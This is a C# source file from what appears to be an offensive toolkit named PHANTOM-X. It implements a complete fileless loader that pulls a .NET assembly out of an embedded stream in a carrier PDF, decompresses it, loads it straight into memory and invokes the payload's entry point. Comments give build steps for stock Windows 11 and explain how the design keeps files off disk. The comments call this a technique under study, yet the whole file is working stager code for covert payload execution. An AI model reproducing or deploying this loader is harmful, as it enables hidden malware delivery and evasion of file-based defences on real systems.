// =============================================================================
// PHANTOM-X :: phase3_fileless/dotnet/PxReflectiveLoader.cs
// =============================================================================
// PxReflectiveLoader.exe -- extracts a .NET assembly from a carrier PDF and
// executes it IN MEMORY.
//
// THE CHAIN
//     carrier.pdf
//       -> locate the /Type /EmbeddedFile stream
//       -> inflate it (FlateDecode) into a byte array
//       -> Assembly.Load(byte[])        <-- no file is written to disk
//       -> invoke PxPayload.Payload.Entry(args) by reflection
//
// WHY Assembly.Load(byte[]) IS THE RIGHT PRIMITIVE HERE
//     The CLR performs the PE mapping, relocation, import binding and TLS
//     setup that a hand-written mapper has to reimplement. Here the payload
//     is a managed assembly, so the loader hands it straight to the loader
//     that is already in the process. The observable result -- a managed
//     assembly resident in memory with no backing file -- is exactly the
//     technique being studied.
//
//     The payload deliberately references only mscorlib and System, so the
//     assembly produced by the stock Windows compiler runs unmodified on a
//     stock Windows 11 machine with no runtime install and no internet.
//
// BUILD (offline, using the compiler Windows already ships):
//     C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /nologo
//         /target:exe /out:PxReflectiveLoader.exe PxReflectiveLoader.cs
//
// USAGE
//     PxReflectiveLoader.exe <carrier.pdf> [args passed to the payload]
// =============================================================================

using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Text;

namespace PxReflectiveLoader
{
    public static class Loader
    {
        private const string EntryType = "PxPayload.Payload";
        private const string EntryMethod = "Entry";

        public static int Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.Error.WriteLine("usage: PxReflectiveLoader.exe <carrier.pdf> [payload args]");
                return 1;
            }

            string pdfPath = args[0];
            string[] payloadArgs = new string[args.Length - 1];
            Array.Copy(args, 1, payloadArgs, 0, payloadArgs.Length);

            try
            {
                Console.WriteLine("[loader] opening " + pdfPath);
                byte[] pdf = File.ReadAllBytes(pdfPath);
                Console.WriteLine("[loader] pdf size " + pdf.Length + " bytes");

                byte[] asm = ExtractEmbedded(pdf);
                if (asm == null || asm.Length == 0)
                {
                    Console.Error.WriteLine("[loader] no embedded file found");
                    return 2;
                }
                Console.WriteLine("[loader] embedded assembly: " + asm.Length + " bytes");
                Console.WriteLine("[loader] first bytes: " + BitConverter.ToString(asm, 0, Math.Min(8, asm.Length)));

                Console.WriteLine("[loader] Assembly.Load(byte[]) -- nothing written to disk");
                Assembly loaded = Assembly.Load(asm);

                Type t = loaded.GetType(EntryType, false);
                if (t == null)
                {
                    Console.Error.WriteLine("[loader] type " + EntryType + " not found in the assembly");
                    Console.Error.WriteLine("[loader] types present: " + Describe(loaded));
                    return 3;
                }

                MethodInfo mi = t.GetMethod(EntryMethod,
                    BindingFlags.Public | BindingFlags.Static);
                if (mi == null)
                {
                    Console.Error.WriteLine("[loader] method " + EntryMethod + " not found");
                    return 4;
                }

                Console.WriteLine("[loader] invoking " + EntryType + "." + EntryMethod);
                mi.Invoke(null, new object[] { payloadArgs });
                return 0;
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine("[loader] failed: " + ex);
                return 5;
            }
        }

        private static string Describe(Assembly a)
        {
            StringBuilder sb = new StringBuilder();
            try
            {
                foreach (Type t in a.GetTypes()) sb.Append(t.FullName).Append("  ");
            }
            catch { }
            return sb.ToString();
        }

        // ---------------------------------------------------------------------
        // PDF embedded-file extraction
        //
        // Locates the stream whose dictionary declares /Type /EmbeddedFile,
        // reads its /Length bytes, and inflates them if the stream is
        // FlateDecode. PDF FlateDecode is a zlib stream, so the two-byte
        // zlib header is skipped before handing the payload to the raw
        // deflate decompressor.
        // ---------------------------------------------------------------------
        private static byte[] ExtractEmbedded(byte[] pdf)
        {
            // ISO-8859-1 (28591) is byte-preserving and exists in .NET
            // Framework 4.x. Encoding.Latin1 is .NET 5+ only, so it would
            // break the build on a stock Windows 11 compiler.
            string text = Encoding.GetEncoding(28591).GetString(pdf);

            int idx = 0;
            while (true)
            {
                int s = text.IndexOf("stream", idx, StringComparison.Ordinal);
                if (s < 0) return null;

                // Dictionary bounds. A naive "nearest << before the keyword"
                // picks up a NESTED dictionary -- an EmbeddedFile dict usually
                // contains a /Params << ... >> block -- and then the outer
                // dictionary is never examined. Match brackets properly.
                int dictStart = FindDictStart(text, s);
                if (dictStart < 0) { idx = s + 6; continue; }
                int dictEnd = FindDictEnd(text, dictStart);
                if (dictEnd < 0) { idx = s + 6; continue; }
                string dict = text.Substring(dictStart, dictEnd - dictStart);

                if (dict.IndexOf("/EmbeddedFile", StringComparison.Ordinal) < 0)
                {
                    idx = s + 6;
                    continue;
                }

                // data begins after the keyword and its line ending
                int dataStart = s + 6;
                if (dataStart + 1 < pdf.Length && pdf[dataStart] == (byte)'\r') dataStart++;
                if (dataStart < pdf.Length && pdf[dataStart] == (byte)'\n') dataStart++;

                int length = ReadLength(dict);
                int end;
                if (length > 0 && dataStart + length <= pdf.Length)
                {
                    end = dataStart + length;
                }
                else
                {
                    int e = text.IndexOf("endstream", dataStart, StringComparison.Ordinal);
                    if (e < 0) return null;
                    end = e;
                    while (end > dataStart &&
                           (pdf[end - 1] == (byte)'\n' || pdf[end - 1] == (byte)'\r'))
                        end--;
                }

                byte[] raw = new byte[end - dataStart];
                Buffer.BlockCopy(pdf, dataStart, raw, 0, raw.Length);

                if (dict.IndexOf("/FlateDecode", StringComparison.Ordinal) >= 0)
                {
                    byte[] inflated = Inflate(raw);
                    if (inflated == null)
                    {
                        Console.Error.WriteLine("[loader] inflate failed");
                        return null;
                    }
                    Console.WriteLine("[loader] inflated " + raw.Length +
                                      " -> " + inflated.Length + " bytes");
                    return inflated;
                }

                Console.WriteLine("[loader] embedded stream is not compressed (" +
                                  raw.Length + " bytes)");
                return raw;
            }
        }

        /// <summary>
        /// Find the start of the dictionary that encloses the stream keyword.
        /// Walking backwards, the first ">>" is that dictionary's close.
        /// Nested dictionaries contribute their own pairs, so a depth counter
        /// is needed: the matching open is the one that balances the FIRST
        /// close encountered.
        /// </summary>
        private static int FindDictStart(string text, int streamPos)
        {
            int closes = 0;
            int i = streamPos;
            while (i >= 2)
            {
                if (text[i - 1] == '>' && text[i] == '>') { closes++; i -= 2; continue; }
                if (text[i - 1] == '<' && text[i] == '<')
                {
                    if (closes == 0) { i -= 2; continue; }
                    if (closes == 1) return i - 1;
                    closes--;
                    i -= 2;
                    continue;
                }
                i--;
            }
            return -1;
        }

        /// <summary>Find the end (exclusive) of the dictionary at dictStart.</summary>
        private static int FindDictEnd(string text, int dictStart)
        {
            int depth = 0;
            int i = dictStart;
            while (i + 1 < text.Length)
            {
                if (text[i] == '<' && text[i + 1] == '<') { depth++; i += 2; continue; }
                if (text[i] == '>' && text[i + 1] == '>')
                {
                    depth--;
                    i += 2;
                    if (depth == 0) return i;
                    continue;
                }
                i++;
            }
            return -1;
        }

        private static int ReadLength(string dict)
        {
            int i = dict.IndexOf("/Length", StringComparison.Ordinal);
            if (i < 0) return -1;
            i += 7;
            while (i < dict.Length && char.IsWhiteSpace(dict[i])) i++;
            int start = i;
            while (i < dict.Length && char.IsDigit(dict[i])) i++;
            if (i == start) return -1;
            int val = int.Parse(dict.Substring(start, i - start));

            // "/Length 12 0 R" -- an indirect reference. Resolve it by
            // finding the object and reading its own /Length.
            int j = i;
            while (j < dict.Length && char.IsWhiteSpace(dict[j])) j++;
            int d2 = j;
            while (d2 < dict.Length && char.IsDigit(dict[d2])) d2++;
            if (d2 > j)
            {
                while (d2 < dict.Length && char.IsWhiteSpace(dict[d2])) d2++;
                if (d2 < dict.Length && dict[d2] == 'R')
                {
                    string pat = val + " 0 obj";
                    int obj = dict.IndexOf(pat, StringComparison.Ordinal);
                    if (obj < 0) return -1;
                    int objEnd = dict.IndexOf("endobj", obj, StringComparison.Ordinal);
                    if (objEnd < 0) return -1;
                    return ReadLength(dict.Substring(obj, objEnd - obj));
                }
            }
            return val;
        }

        private static byte[] Inflate(byte[] zlib)
        {
            try
            {
                // Skip the 2-byte zlib header; DeflateStream wants raw deflate.
                int off = (zlib.Length > 2 && (zlib[0] & 0x0F) == 8) ? 2 : 0;
                using (MemoryStream ms = new MemoryStream(zlib, off, zlib.Length - off))
                using (DeflateStream ds = new DeflateStream(ms, CompressionMode.Decompress))
                using (MemoryStream outMs = new MemoryStream())
                {
                    byte[] buf = new byte[16384];
                    int n;
                    while ((n = ds.Read(buf, 0, buf.Length)) > 0) outMs.Write(buf, 0, n);
                    return outMs.ToArray();
                }
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine("[loader] inflate error: " + ex.Message);
                return null;
            }
        }
    }
}
